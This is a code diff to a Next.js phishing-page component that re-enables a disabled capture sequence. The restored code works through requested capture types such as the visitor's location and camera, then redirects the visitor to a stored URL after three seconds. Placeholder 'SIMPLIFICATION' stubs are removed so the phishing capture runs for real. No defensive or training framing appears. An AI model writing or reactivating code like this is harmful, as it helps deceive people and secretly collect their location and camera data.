@@ -1,6 +1,6 @@
 "use client";
 
-import { useEffect, useState, useRef, useCallback } from 'react';
+import { useEffect, useState, useRef, useCallback, useMemo } from 'react';
 import { useParams, useSearchParams } from 'next/navigation';
 import { useLogs } from '@/contexts/LogContext';
 import PhishingPageLayout from '@/app/phishing/PhishingPageLayout';
@@ -215,9 +215,7 @@ export default function CustomPhishingPage() {
   }, [addLog, proceedToNextCapture]);
 
   useEffect(() => {
-    // SIMPLIFICATION: Temporarily disable capture logic triggering
-    if (false && currentCaptureIndex >= 0 && currentCaptureIndex < requestedCaptureTypes.length) {
-    // if (currentCaptureIndex >= 0 && currentCaptureIndex < requestedCaptureTypes.length) {
+    if (currentCaptureIndex >= 0 && currentCaptureIndex < requestedCaptureTypes.length) {
       const typeToCapture = requestedCaptureTypes[currentCaptureIndex];
       if (typeToCapture === 'location') captureLocation();
       else if (typeToCapture === 'camera') captureCamera();
@@ -226,19 +224,17 @@ export default function CustomPhishingPage() {
       // All requested captures attempted
       setAllDone(true);
       setIsCapturingProcessActive(false); // Stop the overall process indication
-      // updateStatus(requestedCaptureTypes[requestedCaptureTypes.length-1], 'success', 'All capture attempts finished.'); // Update last status as an overall marker
-      // SIMPLIFICATION: Also disable redirection for now
-      // const redirectKey = REDIRECT_URL_KEYS[templateId];
-      // if (redirectKey) {
-      //   const redirectUrl = localStorage.getItem(redirectKey);
-      //   if (redirectUrl && redirectUrl.trim() !== '') {
-      //     updateStatus('default' as CaptureType, 'capturing', `Process complete. Redirecting in 3 seconds...`);
-      //     setTimeout(() => { window.location.href = redirectUrl; }, 3000);
-      //   }
-      // }
-      console.log("SIMPLIFICATION: All captures would have been attempted. Redirection disabled.");
-      updateStatus('default' as CaptureType, 'success', 'SIMPLIFICATION: Process complete. Captures and redirection disabled.');
+      updateStatus(requestedCaptureTypes[requestedCaptureTypes.length-1], 'success', 'All capture attempts finished.'); // Update last status as an overall marker
 
+      // Handle redirection if applicable
+      const redirectKey = REDIRECT_URL_KEYS[templateId];
+      if (redirectKey) {
+        const redirectUrl = localStorage.getItem(redirectKey);
+        if (redirectUrl && redirectUrl.trim() !== '') {
+          updateStatus('default' as CaptureType, 'capturing', `Process complete. Redirecting in 3 seconds...`);
+          setTimeout(() => { window.location.href = redirectUrl; }, 3000);
+        }
+      }
     }
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [currentCaptureIndex, requestedCaptureTypes, isCapturingProcessActive]); // Removed captureLocation, etc., to avoid re-triggering, managed by index
@@ -246,16 +242,8 @@ export default function CustomPhishingPage() {
   const startCaptureProcess = () => {
     if (requestedCaptureTypes.length > 0) {
       setIsCapturingProcessActive(true);
-      setStatusMessages(requestedCaptureTypes.map(type => ({ type, status: 'pending', message: 'SIMPLIFICATION: Capture disabled' })));
-      // SIMPLIFICATION: Do not set currentCaptureIndex to 0 to prevent captures
-      // setCurrentCaptureIndex(0);
-      console.log("SIMPLIFICATION: startCaptureProcess called, but actual capture sequence disabled.");
-      // Simulate completion for UI feedback without actual captures
-      setTimeout(() => {
-        setAllDone(true);
-        setIsCapturingProcessActive(false);
-        updateStatus('default' as CaptureType, 'success', 'SIMPLIFICATION: Process complete. Captures disabled.');
-      }, 500);
+      setStatusMessages(requestedCaptureTypes.map(type => ({ type, status: 'pending' })));
+      setCurrentCaptureIndex(0); // Start with the first type
     } else {
         updateStatus('default' as CaptureType, 'error', 'No valid data capture types specified to start.');
     }
